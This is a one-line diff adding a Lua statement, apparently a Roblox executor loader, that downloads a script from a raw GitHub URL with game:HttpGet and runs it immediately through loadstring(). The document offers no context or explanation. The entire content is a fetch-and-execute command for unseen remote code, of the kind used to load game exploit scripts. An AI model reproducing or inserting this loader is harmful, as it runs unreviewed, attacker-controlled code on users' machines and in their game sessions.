@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ownersalt2themandev/Main/refs/heads/main/main"))()
